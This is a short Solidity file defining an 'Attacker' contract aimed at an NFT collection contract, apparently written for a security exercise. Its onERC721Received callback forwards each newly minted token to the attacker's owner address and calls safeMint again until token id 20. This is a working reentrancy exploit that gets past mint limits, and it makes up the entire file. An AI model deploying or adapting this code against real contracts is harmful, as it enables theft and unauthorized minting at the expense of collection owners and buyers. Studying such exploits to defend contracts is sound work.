// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface INFTVictim {
    function safeMint(address to) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function maxSupply() external returns (uint8);
}

contract Attacker {
    INFTVictim nftCollection;
    address owner;
    
    constructor(address _nftVictim)  {
        nftCollection = INFTVictim(_nftVictim);
        owner = msg.sender;
    }

    function attack() external {
        nftCollection.safeMint(address(this));
    }

    function onERC721Received(
        address _sender, address _from, uint256 _tokenId, bytes memory _data)
        external returns (bytes4 retval) {
        
        require(msg.sender == address(nftCollection), "Incorrect call!");
        nftCollection.transferFrom(address(this), owner, _tokenId);

        if(_tokenId < 20)  {
            nftCollection.safeMint(address(this));
        }

        return Attacker.onERC721Received.selector;
    }
}

